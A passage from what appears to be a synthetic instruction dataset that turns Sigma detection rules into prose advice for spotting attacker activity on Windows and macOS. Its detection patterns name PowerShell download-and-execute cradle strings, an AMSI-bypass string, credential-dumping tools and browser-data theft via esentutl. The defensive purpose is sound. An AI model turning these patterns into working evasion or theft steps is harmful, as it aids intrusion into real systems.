    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a file on disk that has an imphash of a well-known hack tool",
      "answer": "In order to detect the creation of a file on disk that has an imphash of a well-known hack tool, you should: Monitor Windows systems for file creation events where the file's imphash matches a list of hashes associated with widely recognized hacking tools. This detection mechanism relies on the logging capabilities of Sysmon, specifically with Imphash logging enabled, to track the creation of files that may be indicative of malicious activity. \n\nThe list of imphashes to watch for includes signatures of several high-profile hacking tools and techniques such as PetitPotam, Mimikatz, JuicyPotato, RoguePotato, Pwdump, Htran, Cobalt Strike beacons, PPLDump, NanoDump, HandleKatz, DripLoader, CreateMiniDump, UACMe Akagi, WCE, Sliver Stagers, Dumpert, SysmonEnte, SysmonQuiet, ShaprEvtMute Hook, Forkatz, PPLKiller, and Backstab. These tools are used in a variety of cyber attacks for exploitation, credential dumping, lateral movement, privilege escalation, and evasion techniques.\n\nThe detection focuses on the 'Imphash' and 'Hash|contains' parameters within the system's event logs, specifically within the 'create_stream_hash' category. This aids in identifying the presence of these tools when they are executed or moved within the Windows environment, suggesting potential unauthorized activities or breaches.\n\nThe log source for this detection method is Windows, and the category to be monitored is `create_stream_hash`. It's crucial to ensure that Sysmon configuration includes Imphash logging to capture the necessary data for this detection to work. The fields 'TargetFilename' and 'Image' within the logs can provide additional context about the suspected malicious file creation events, such as the file name and the path of the newly created file.\n\nThis detection strategy is classified at a high level of importance due to the severe implications of a successful attack using these tools. However, it's worth noting that there may be unknown false positives, indicating the need for manual verification of detection alerts to confirm the nature of the detected activity."
    }
  },
  {
    "instruction": "Please help me detect the following: Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
    "context": "",
    "output": "Sure!\nIn order to monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious, you should: Focus on monitoring set value events within the Windows registry, specifically those that target the registry path associated with the 'TaskCache' of the Windows Scheduler. This involves looking for any modification attempts to 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\'.\n\nIt's critical to exclude changes made by a set of known and trusted Windows processes which might legitimately interact with scheduled tasks. These trusted processes include but are not limited to, Windows Update Orchestrator, Software Protection Platform SvcRestartTask, Flighting OneSettings RefreshCache, the Trusted Installer Worker (TiWorker.exe) when it's located in the Windows directory, the .NET Framework Native Image Generator (ngen.exe), particularly when it's modifying keys associated with the .NET Framework NGEN tasks, Microsoft Office's Click-To-Run integrator, the MSI installer (msiexec.exe), the Dropbox updater, and the Windows File Explorer when it interacts with specific Performance Monitor scheduled tasks. Furthermore, any modifications initiated by the system itself should be disregarded as benign.\n\nThis monitoring is aimed at identifying potential malicious activity where attackers might register new tasks to maintain persistence or escalate privileges without using the standard `svchost.exe` process for task manipulation, which might indicate an evasion attempt. This detection strategy is aligned with various MITRE ATT&CK techniques such as Persistence, Privilege Escalation, and Execution, providing a valuable layer of defense against stealthy threats aiming to manipulate scheduled tasks for malicious purposes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
      "answer": "In order to monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious, you should: Focus on monitoring set value events within the Windows registry, specifically those that target the registry path associated with the 'TaskCache' of the Windows Scheduler. This involves looking for any modification attempts to 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\'.\n\nIt's critical to exclude changes made by a set of known and trusted Windows processes which might legitimately interact with scheduled tasks. These trusted processes include but are not limited to, Windows Update Orchestrator, Software Protection Platform SvcRestartTask, Flighting OneSettings RefreshCache, the Trusted Installer Worker (TiWorker.exe) when it's located in the Windows directory, the .NET Framework Native Image Generator (ngen.exe), particularly when it's modifying keys associated with the .NET Framework NGEN tasks, Microsoft Office's Click-To-Run integrator, the MSI installer (msiexec.exe), the Dropbox updater, and the Windows File Explorer when it interacts with specific Performance Monitor scheduled tasks. Furthermore, any modifications initiated by the system itself should be disregarded as benign.\n\nThis monitoring is aimed at identifying potential malicious activity where attackers might register new tasks to maintain persistence or escalate privileges without using the standard `svchost.exe` process for task manipulation, which might indicate an evasion attempt. This detection strategy is aligned with various MITRE ATT&CK techniques such as Persistence, Privilege Escalation, and Execution, providing a valuable layer of defense against stealthy threats aiming to manipulate scheduled tasks for malicious purposes."
    }
  },
  {
    "instruction": "Explain how should I detect the following: PowerShell download and execution cradles.",
    "context": "",
    "output": "In order to detect PowerShell download and execution cradles, you should: monitor Windows process creation logs for command lines that indicate the use of PowerShell commands associated with downloading or executing scripts or files from the internet. Specifically, look for command lines containing phrases like `.DownloadString(`, `.DownloadFile(`, `Invoke-WebRequest `, or the abbreviation `iwr ` that suggest downloading activity. Furthermore, watch out for expressions such as `;iex $`, `| IEX`, `|IEX `, `I`E`X`, `I`EX`, `IE`X`, `iex `, `IEX (`, `IEX(`, and `Invoke-Expression` which indicate an attempt to execute PowerShell expressions, often used by attackers to run malicious scripts directly in memory without writing to disk. It's important to note that some legitimate PowerShell installers might use similar command patterns, so you need to apply appropriate filters to reduce false positives. This monitoring is critical because it captures the technique often utilized by attackers to bypass traditional defenses by leveraging PowerShell for malicious downloads and execution.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "PowerShell download and execution cradles.",
      "answer": "In order to detect PowerShell download and execution cradles, you should: monitor Windows process creation logs for command lines that indicate the use of PowerShell commands associated with downloading or executing scripts or files from the internet. Specifically, look for command lines containing phrases like `.DownloadString(`, `.DownloadFile(`, `Invoke-WebRequest `, or the abbreviation `iwr ` that suggest downloading activity. Furthermore, watch out for expressions such as `;iex $`, `| IEX`, `|IEX `, `I`E`X`, `I`EX`, `IE`X`, `iex `, `IEX (`, `IEX(`, and `Invoke-Expression` which indicate an attempt to execute PowerShell expressions, often used by attackers to run malicious scripts directly in memory without writing to disk. It's important to note that some legitimate PowerShell installers might use similar command patterns, so you need to apply appropriate filters to reduce false positives. This monitoring is critical because it captures the technique often utilized by attackers to bypass traditional defenses by leveraging PowerShell for malicious downloads and execution."
    }
  },
  {
    "instruction": "Please help me detect the following: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.",
    "context": "",
    "output": "Sure!\nIn order to detect adversaries who may use binary padding to add junk data and change the on-disk representation of malware on macOS systems, you should: Monitor process creation logs for instances where either the 'truncate' command ends with '/truncate' and contains the '-s +' in the command line indicating an increase in file size, or the 'dd' command ends with '/dd' and includes command lines that contain 'if=/dev/zero' for null padding, 'if=/dev/random' for high-quality random data, and 'if=/dev/urandom' for low-quality random data. These activities could signify attempts to use binary padding to manipulate the appearance of malware on the disk. It's important to note that there might be legitimate uses of these commands in scripts, so any detection should be reviewed to confirm the context of their use. The severity of this rule is considered high because it's associated with techniques aimed at evading detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.",
      "answer": "In order to detect adversaries who may use binary padding to add junk data and change the on-disk representation of malware on macOS systems, you should: Monitor process creation logs for instances where either the 'truncate' command ends with '/truncate' and contains the '-s +' in the command line indicating an increase in file size, or the 'dd' command ends with '/dd' and includes command lines that contain 'if=/dev/zero' for null padding, 'if=/dev/random' for high-quality random data, and 'if=/dev/urandom' for low-quality random data. These activities could signify attempts to use binary padding to manipulate the appearance of malware on the disk. It's important to note that there might be legitimate uses of these commands in scripts, so any detection should be reviewed to confirm the context of their use. The severity of this rule is considered high because it's associated with techniques aimed at evading detection."
    }
  },
  {
    "instruction": "Can you explain how to detect: execution of an MSI file using PowerShell and the WMI Win32_Product class",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the execution of an MSI file using PowerShell and the WMI Win32_Product class, you should: focus on monitoring PowerShell script activities within Windows environments, particularly ensuring that Script Block Logging is enabled for comprehensive visibility. The core detection method revolves around identifying scripts that execute MSI files via PowerShell by leveraging the `Invoke-CimMethod` command alongside the `Win32_Product` class, explicitly focusing on instances where `-ClassName` and `-MethodName` parameters are used in conjunction with references to `.msi` files. It's important to be mindful of potential unknown false positives due to the versatility of PowerShell scripting, categorizing the detection level as medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of an MSI file using PowerShell and the WMI Win32_Product class",
      "answer": "In order to detect the execution of an MSI file using PowerShell and the WMI Win32_Product class, you should: focus on monitoring PowerShell script activities within Windows environments, particularly ensuring that Script Block Logging is enabled for comprehensive visibility. The core detection method revolves around identifying scripts that execute MSI files via PowerShell by leveraging the `Invoke-CimMethod` command alongside the `Win32_Product` class, explicitly focusing on instances where `-ClassName` and `-MethodName` parameters are used in conjunction with references to `.msi` files. It's important to be mindful of potential unknown false positives due to the versatility of PowerShell scripting, categorizing the detection level as medium."
    }
  },
  {
    "instruction": "Can you explain how to detect: Windows Defender logs when the history of detected infections is deleted. Log file will contain the message \"Windows Defender Antivirus has removed history of malware and other potentially unwanted software\".",
    "context": "",
    "output": "Certainly!\n\nIn order to detect instances where Windows Defender logs when the history of detected infections is deleted, and the log file contains the message \"Windows Defender Antivirus has removed history of malware and other potentially unwanted software\", you should: Monitor Windows Defender (WinDefend) logs specifically for Event ID 1013, which signifies that the antimalware platform has deleted the history of malware and other potentially unwanted software. It's important to be aware of this event as it could indicate an attempt to hide previous infections or malicious activity on the system. However, note that there can be legitimate reasons for the deletion of Defender malware detections history, so the risk level associated with this detection is considered low. Keep an eye on the EventID and EventType fields for any occurrences of this event.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Windows Defender logs when the history of detected infections is deleted. Log file will contain the message \"Windows Defender Antivirus has removed history of malware and other potentially unwanted software\".",
      "answer": "In order to detect instances where Windows Defender logs when the history of detected infections is deleted, and the log file contains the message \"Windows Defender Antivirus has removed history of malware and other potentially unwanted software\", you should: Monitor Windows Defender (WinDefend) logs specifically for Event ID 1013, which signifies that the antimalware platform has deleted the history of malware and other potentially unwanted software. It's important to be aware of this event as it could indicate an attempt to hide previous infections or malicious activity on the system. However, note that there can be legitimate reasons for the deletion of Defender malware detections history, so the risk level associated with this detection is considered low. Keep an eye on the EventID and EventType fields for any occurrences of this event."
    }
  },
  {
    "instruction": "How to detect: use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\nInvolved domains are bin.equinox.io for download and *.ngrok.io for connections.\n",
    "context": "",
    "output": "In order to detect the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available, you should: focus on monitoring process creation logs on Windows systems. Look for command lines that contain specific patterns indicating port forwarding activities over common ports such as 139 (SMB), 445 (Microsoft-DS SMB file sharing), 3389 (RDP), 5985 (WinRM HTTP), and 5986 (WinRM HTTPS). Additionally, detect instances where command lines include arguments that start Ngrok with all configurations from a YAML file, which is a strong indication of configuring a tunnel. Monitoring for the execution of 'ngrok.exe' is crucial, especially when command lines involve initiating TCP or HTTP tunnels or when an authtoken is specified, as this often relates to setting up secure connections using Ngrok. Also, watch out for command lines executing any executable followed by 'authtoken' or starting Ngrok with '--all' switch, which might indicate an attempt to launch tunnels automatically. However, be aware of legitimate uses of these command line switches by other tools or when Ngrok is used for authorized development purposes such as debugging with HTTP 3978. The alert level for these detections should be considered high due to the potential for abuse in facilitating remote access to local services, which could be indicative of initial access or persistence mechanisms by threat actors.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\nInvolved domains are bin.equinox.io for download and *.ngrok.io for connections.\n",
      "answer": "In order to detect the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available, you should: focus on monitoring process creation logs on Windows systems. Look for command lines that contain specific patterns indicating port forwarding activities over common ports such as 139 (SMB), 445 (Microsoft-DS SMB file sharing), 3389 (RDP), 5985 (WinRM HTTP), and 5986 (WinRM HTTPS). Additionally, detect instances where command lines include arguments that start Ngrok with all configurations from a YAML file, which is a strong indication of configuring a tunnel. Monitoring for the execution of 'ngrok.exe' is crucial, especially when command lines involve initiating TCP or HTTP tunnels or when an authtoken is specified, as this often relates to setting up secure connections using Ngrok. Also, watch out for command lines executing any executable followed by 'authtoken' or starting Ngrok with '--all' switch, which might indicate an attempt to launch tunnels automatically. However, be aware of legitimate uses of these command line switches by other tools or when Ngrok is used for authorized development purposes such as debugging with HTTP 3978. The alert level for these detections should be considered high due to the potential for abuse in facilitating remote access to local services, which could be indicative of initial access or persistence mechanisms by threat actors."
    }
  },
  {
    "instruction": "Can you explain how to detect: use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts, you should: focus on monitoring process creation events on Windows systems. This entails paying close attention to the command line arguments used in processes. Specifically, watch for occurrences where the command line includes '/account=system ' or '/account=ti ' which indicates an attempt to execute commands with elevated privileges attributed to the System or TrustedInstaller accounts. Additionally, be alert for the presence of '/exec=' in the command line, signifying the execution of specific commands or operations. These indicators are critical for identifying potential misuse or exploitation attempts involving the RunXCmd tool. It's worth noting that while this detection strategy is effective, there may be instances where such command line usage is legitimate and authorized by administrators. Therefore, while the security level associated with this rule is considered high, it is advisable to verify the context of detected events to distinguish between malicious activities and legitimate administrative tasks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts",
      "answer": "In order to detect the use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts, you should: focus on monitoring process creation events on Windows systems. This entails paying close attention to the command line arguments used in processes. Specifically, watch for occurrences where the command line includes '/account=system ' or '/account=ti ' which indicates an attempt to execute commands with elevated privileges attributed to the System or TrustedInstaller accounts. Additionally, be alert for the presence of '/exec=' in the command line, signifying the execution of specific commands or operations. These indicators are critical for identifying potential misuse or exploitation attempts involving the RunXCmd tool. It's worth noting that while this detection strategy is effective, there may be instances where such command line usage is legitimate and authorized by administrators. Therefore, while the security level associated with this rule is considered high, it is advisable to verify the context of detected events to distinguish between malicious activities and legitimate administrative tasks."
    }
  },
  {
    "instruction": "How can I detect: potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
    "context": "",
    "output": "In order to detect potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations, you should monitor for process creation events on Windows systems where the parent process is a common web browser (like Brave, Chrome, Firefox, Microsoft Edge, or Opera) or an email client (such as Outlook). Specifically, look for instances where these types of applications initiate the Remote Desktop Protocol (RDP) client (mstsc.exe), as this could indicate an attempt to establish an RDP session from a potentially malicious or suspicious source. This activity is considered highly unusual and unlikely to occur during normal operations, thus it carries a high alert level due to its potential implications on security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
      "answer": "In order to detect potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations, you should monitor for process creation events on Windows systems where the parent process is a common web browser (like Brave, Chrome, Firefox, Microsoft Edge, or Opera) or an email client (such as Outlook). Specifically, look for instances where these types of applications initiate the Remote Desktop Protocol (RDP) client (mstsc.exe), as this could indicate an attempt to establish an RDP session from a potentially malicious or suspicious source. This activity is considered highly unusual and unlikely to occur during normal operations, thus it carries a high alert level due to its potential implications on security."
    }
  },
  {
    "instruction": "How to detect: Detection of sc.exe utility adding a new service with special permission which hides that service.",
    "context": "",
    "output": "In order to detect the sc.exe utility adding a new service with special permission which hides that service, you should: monitor for the creation of processes on Windows systems, specifically focusing on instances where the process image either ends with '\\sc.exe' or has an original file name of 'sc.exe'. Additionally, you should look for command line arguments containing 'sdset'. Both of these conditions should be met to confidently identify the suspicious activity. This monitoring is aimed at identifying malicious attempts to manipulate services, a technique that could be utilized to maintain persistence, evade detection, or gain unauthorized access to system resources.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detection of sc.exe utility adding a new service with special permission which hides that service.",
      "answer": "In order to detect the sc.exe utility adding a new service with special permission which hides that service, you should: monitor for the creation of processes on Windows systems, specifically focusing on instances where the process image either ends with '\\sc.exe' or has an original file name of 'sc.exe'. Additionally, you should look for command line arguments containing 'sdset'. Both of these conditions should be met to confidently identify the suspicious activity. This monitoring is aimed at identifying malicious attempts to manipulate services, a technique that could be utilized to maintain persistence, evade detection, or gain unauthorized access to system resources."
    }
  },
  {
    "instruction": "How can I detect: usage of special strings/null bits in order to potentially bypass AMSI functionalities",
    "context": "",
    "output": "In order to detect usage of special strings/null bits in order to potentially bypass AMSI functionalities, you should: look for PowerShell script actions on Windows systems where Script Block Logging is enabled. Specifically, focus on identifying PowerShell commands that contain peculiar patterns such as \"if(0){{{0}}}' -f $(0 -as [char]) +\" or the representation of null bits through \"#<NULL>\". These patterns are unusual and may suggest an attempt to circumvent Anti-Malware Software Interface (AMSI) checks, which are designed to scan scripts and other code in memory for malware. Be aware that while these indicators can point to potential bypass attempts, not all uses may be malicious in nature, leading to possible unknown false positives. The significance of detecting these patterns is considered to be of medium level, indicating a noteworthy but not definitive sign of attempted evasion or malicious activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of special strings/null bits in order to potentially bypass AMSI functionalities",
      "answer": "In order to detect usage of special strings/null bits in order to potentially bypass AMSI functionalities, you should: look for PowerShell script actions on Windows systems where Script Block Logging is enabled. Specifically, focus on identifying PowerShell commands that contain peculiar patterns such as \"if(0){{{0}}}' -f $(0 -as [char]) +\" or the representation of null bits through \"#<NULL>\". These patterns are unusual and may suggest an attempt to circumvent Anti-Malware Software Interface (AMSI) checks, which are designed to scan scripts and other code in memory for malware. Be aware that while these indicators can point to potential bypass attempts, not all uses may be malicious in nature, leading to possible unknown false positives. The significance of detecting these patterns is considered to be of medium level, indicating a noteworthy but not definitive sign of attempted evasion or malicious activity."
    }
  },
  {
    "instruction": "How to detect: creation of a file named \"ErrorHandler.cmd\" in the \"C:\\WINDOWS\\Setup\\Scripts\\\" directory which could be used as a method of persistence\nThe content of C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd is read whenever some tools under C:\\WINDOWS\\System32\\oobe\\ (e.g. Setup.exe) fail to run for any reason.\n",
    "context": "",
    "output": "In order to detect the creation of a file named \"ErrorHandler.cmd\" in the \"C:\\WINDOWS\\Setup\\Scripts\\\" directory which could be used as a method of persistence, you should: Monitor file event logs on Windows-based systems, specifically looking for the creation of files that end with the path \"\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd\". This file is of interest because its content is executed whenever certain tools, such as those located in \"C:\\WINDOWS\\System32\\oobe\\\" (for example, Setup.exe), encounter execution failures. The creation of such a file could indicate an attempt to maintain persistence within the system by exploiting these tool failures to execute malicious scripts. False positives are currently unknown, implying that any detection should be investigated. The threat level for this activity is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a file named \"ErrorHandler.cmd\" in the \"C:\\WINDOWS\\Setup\\Scripts\\\" directory which could be used as a method of persistence\nThe content of C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd is read whenever some tools under C:\\WINDOWS\\System32\\oobe\\ (e.g. Setup.exe) fail to run for any reason.\n",
      "answer": "In order to detect the creation of a file named \"ErrorHandler.cmd\" in the \"C:\\WINDOWS\\Setup\\Scripts\\\" directory which could be used as a method of persistence, you should: Monitor file event logs on Windows-based systems, specifically looking for the creation of files that end with the path \"\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd\". This file is of interest because its content is executed whenever certain tools, such as those located in \"C:\\WINDOWS\\System32\\oobe\\\" (for example, Setup.exe), encounter execution failures. The creation of such a file could indicate an attempt to maintain persistence within the system by exploiting these tool failures to execute malicious scripts. False positives are currently unknown, implying that any detection should be investigated. The threat level for this activity is considered medium."
    }
  },
  {
    "instruction": "How can I detect: suspicious process executions in which Sysmon itself is the parent of a process, which could be a sign of exploitation (e.g. CVE-2022-41120)",
    "context": "",
    "output": "In order to detect suspicious process executions in which Sysmon itself is the parent of a process, which could be a sign of exploitation (e.g. CVE-2022-41120), you should: Monitor for processes that have been launched by 'Sysmon.exe' or 'Sysmon64.exe'. However, it's critical to exclude certain processes from triggering alerts. These processes include 'Sysmon.exe', 'Sysmon64.exe', 'conhost.exe', 'wevtutil.exe', and 'WerFault.exe' found in their respective Windows directories, as well as any instance of 'Sysmon.exe' located in the '\\AppData\\Local\\Temp' directory. By filtering these out, the focus is on genuine anomalies rather than regular activity that involves Sysmon. This approach minimizes false positives, ensuring that when an alert triggers, it is highly likely to be indicative of actual exploitation attempts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious process executions in which Sysmon itself is the parent of a process, which could be a sign of exploitation (e.g. CVE-2022-41120)",
      "answer": "In order to detect suspicious process executions in which Sysmon itself is the parent of a process, which could be a sign of exploitation (e.g. CVE-2022-41120), you should: Monitor for processes that have been launched by 'Sysmon.exe' or 'Sysmon64.exe'. However, it's critical to exclude certain processes from triggering alerts. These processes include 'Sysmon.exe', 'Sysmon64.exe', 'conhost.exe', 'wevtutil.exe', and 'WerFault.exe' found in their respective Windows directories, as well as any instance of 'Sysmon.exe' located in the '\\AppData\\Local\\Temp' directory. By filtering these out, the focus is on genuine anomalies rather than regular activity that involves Sysmon. This approach minimizes false positives, ensuring that when an alert triggers, it is highly likely to be indicative of actual exploitation attempts."
    }
  },
  {
    "instruction": "Explain how should I detect the following: scenarios where an Windows Defender exclusion was added in registry where an entity would want to bypass antivirus scanning from Windows Defender",
    "context": "",
    "output": "In order to detect scenarios where an Windows Defender exclusion was added in registry where an entity would want to bypass antivirus scanning from Windows Defender, you should: Monitor security logs from Windows systems, specifically focusing on Audit Policy settings or Registry System Access Control (SACL) auditing for users, as these are prerequisites for detecting the activity. Key events of interest are Windows Security Event IDs 4657 (A registry value was modified), 4656 (A handle to an object was requested), 4660 (An object was deleted), and 4663 (An attempt was made to access an object). Pay particular attention to modifications, access requests, deletions, or any interactions with object names that contain the path '\\Microsoft\\Windows Defender\\Exclusions\\'. This path is indicative of changes being made to the locations of Windows Defender\u2019s antivirus scanning exclusions in the registry, a common tactic used by attackers to bypass antivirus detection by excluding malware files from scanning. Be aware that there could be legitimate reasons for such changes, such as intended inclusions by an administrator. Due to the high potential impact of allowing malware to run undetected, these alerts are considered high level.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "scenarios where an Windows Defender exclusion was added in registry where an entity would want to bypass antivirus scanning from Windows Defender",
      "answer": "In order to detect scenarios where an Windows Defender exclusion was added in registry where an entity would want to bypass antivirus scanning from Windows Defender, you should: Monitor security logs from Windows systems, specifically focusing on Audit Policy settings or Registry System Access Control (SACL) auditing for users, as these are prerequisites for detecting the activity. Key events of interest are Windows Security Event IDs 4657 (A registry value was modified), 4656 (A handle to an object was requested), 4660 (An object was deleted), and 4663 (An attempt was made to access an object). Pay particular attention to modifications, access requests, deletions, or any interactions with object names that contain the path '\\Microsoft\\Windows Defender\\Exclusions\\'. This path is indicative of changes being made to the locations of Windows Defender\u2019s antivirus scanning exclusions in the registry, a common tactic used by attackers to bypass antivirus detection by excluding malware files from scanning. Be aware that there could be legitimate reasons for such changes, such as intended inclusions by an administrator. Due to the high potential impact of allowing malware to run undetected, these alerts are considered high level."
    }
  },
  {
    "instruction": "How to detect: One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe",
    "context": "",
    "output": "In order to detect an instance where Qbot may be attempting to steal sensitive information by extracting browser data from Internet Explorer and Microsoft Edge using the built-in utility esentutl.exe, you should: monitor for process creation activities on Windows systems, specifically focusing on instances where the process image ends with '\\esentutl.exe' or has an original file name of 'esentutl.exe'. Additionally, pay close attention to the command line arguments for signs of the '/r' or '-r' flags, which are indicative of database recovery operations, and the presence of command line paths pointing to '\\Windows\\WebCache', which is a directory related to the caching of web data by browsers. It's important to consider all these conditions together to accurately identify potential malicious activities. Note that there may be legitimate uses of esentutl.exe, so any detection should be analyzed in the context of additional suspicious behavior. The severity level for this type of detection is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe",
      "answer": "In order to detect an instance where Qbot may be attempting to steal sensitive information by extracting browser data from Internet Explorer and Microsoft Edge using the built-in utility esentutl.exe, you should: monitor for process creation activities on Windows systems, specifically focusing on instances where the process image ends with '\\esentutl.exe' or has an original file name of 'esentutl.exe'. Additionally, pay close attention to the command line arguments for signs of the '/r' or '-r' flags, which are indicative of database recovery operations, and the presence of command line paths pointing to '\\Windows\\WebCache', which is a directory related to the caching of web data by browsers. It's important to consider all these conditions together to accurately identify potential malicious activities. Note that there may be legitimate uses of esentutl.exe, so any detection should be analyzed in the context of additional suspicious behavior. The severity level for this type of detection is considered medium."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.",
    "context": "",
    "output": "In order to detect execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands, you should: monitor process creation logs on Windows systems for instances where the process image ends with '\\adplus.exe' or has an OriginalFileName of 'Adplus.exe'. Additionally, examine the command line arguments for specific patterns such as ' -hang ', ' -pn ', ' -pmn ', ' -p ', ' -po ', indicative of a dump process memory attempt, ' -c ' for using a config file, and ' -sc ' for executing commands inline. All these indicators combined suggest malicious activity, although it's important to note that AdPlus.exe could be used legitimately for debugging. In cases where these patterns are detected, a high level of scrutiny is warranted due to the tool's potential misuse in bypassing security mechanisms.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.",
      "answer": "In order to detect execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands, you should: monitor process creation logs on Windows systems for instances where the process image ends with '\\adplus.exe' or has an OriginalFileName of 'Adplus.exe'. Additionally, examine the command line arguments for specific patterns such as ' -hang ', ' -pn ', ' -pmn ', ' -p ', ' -po ', indicative of a dump process memory attempt, ' -c ' for using a config file, and ' -sc ' for executing commands inline. All these indicators combined suggest malicious activity, although it's important to note that AdPlus.exe could be used legitimately for debugging. In cases where these patterns are detected, a high level of scrutiny is warranted due to the tool's potential misuse in bypassing security mechanisms."
    }
  },
  {
    "instruction": "Explain how should I detect the following: abusing Windows 10 Narrator's Feedback-Hub",
    "context": "",
    "output": "In order to detect abusing Windows 10 Narrator's Feedback-Hub, you should monitor the Windows registry for specific event types and targets associated with this exploit. Specifically, focus on registry event logs within Windows products for deletion events. Owing attention to changes in registry values is crucial, particularly watching for two specific patterns in the TargetObject paths.\n\nThe first pattern to look out for involves events where the `EventType` signifies a `DeleteValue` action and the `TargetObject` path ends with \u2018\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\DelegateExecute\u2019. This path is indicative of alterations potentially being made to exploit the Narrator's Feedback-Hub feature, which attackers might target to gain unauthorized access or execute commands.\n\nThe second detection pattern requires monitoring for modifications where the `TargetObject` path concludes with \u2018\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\(Default)\u2019. Such changes often involve adding a payload in the (Default) registry value, which can be an attempt to manipulate the system\u2019s behaviors in malicious ways.\n\nFor an effective detection strategy, employing a condition that triggers an alert if any one of these patterns is observed is recommended. Given these are specific and targeted modifications, there may be few to no known legitimate reasons (false positives) for these changes, which categorizes the detected activity under a high severity level.\n\nThis monitoring strategy is aligned with recognizing tactics and techniques that exploit specific Windows features for malicious purposes, underscoring the importance of vigilance in registry event logging as a means to safeguard against sophisticated attacks on Windows 10 systems.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "abusing Windows 10 Narrator's Feedback-Hub",
      "answer": "In order to detect abusing Windows 10 Narrator's Feedback-Hub, you should monitor the Windows registry for specific event types and targets associated with this exploit. Specifically, focus on registry event logs within Windows products for deletion events. Owing attention to changes in registry values is crucial, particularly watching for two specific patterns in the TargetObject paths.\n\nThe first pattern to look out for involves events where the `EventType` signifies a `DeleteValue` action and the `TargetObject` path ends with \u2018\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\DelegateExecute\u2019. This path is indicative of alterations potentially being made to exploit the Narrator's Feedback-Hub feature, which attackers might target to gain unauthorized access or execute commands.\n\nThe second detection pattern requires monitoring for modifications where the `TargetObject` path concludes with \u2018\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\(Default)\u2019. Such changes often involve adding a payload in the (Default) registry value, which can be an attempt to manipulate the system\u2019s behaviors in malicious ways.\n\nFor an effective detection strategy, employing a condition that triggers an alert if any one of these patterns is observed is recommended. Given these are specific and targeted modifications, there may be few to no known legitimate reasons (false positives) for these changes, which categorizes the detected activity under a high severity level.\n\nThis monitoring strategy is aligned with recognizing 